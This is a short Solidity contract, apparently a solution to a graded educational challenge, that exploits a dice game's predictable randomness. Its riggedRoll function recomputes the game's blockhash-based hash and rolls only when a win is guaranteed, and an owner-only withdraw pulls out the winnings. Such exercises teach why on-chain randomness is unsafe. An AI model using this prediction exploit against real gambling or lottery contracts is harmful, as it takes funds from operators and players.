pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negatively impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
    DiceGame public diceGame;

    constructor(address payable diceGameAddress) Ownable(msg.sender) {
        diceGame = DiceGame(diceGameAddress);
    }

    // Implement the `withdraw` function to transfer Ether from the rigged contract to a specified address.
    function withdraw(address account, uint256 amount) external onlyOwner {
        require(address(this).balance >= amount, "No enough balance to withdraw");
        (bool success, ) = account.call{value: amount}("");
        require(success, "Transfer failed");
    }

    // Create the `riggedRoll()` function to predict the randomness in the DiceGame contract and only initiate a roll when it guarantees a win.
    function riggedRoll() external {
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), diceGame.nonce()));
        uint256 roll = uint256(hash) % 16;

        console.log("\t Rigged Roll: ", roll);
        if (roll > 5) {
            return;
        } else {
            require(address(this).balance >= 0.002 ether, "Not enough balance to roll the dice");
            diceGame.rollTheDice{value: 0.002 ether}();
        }
    }

    // Include the `receive()` function to enable the contract to receive incoming Ether.
    receive() external payable {}
}
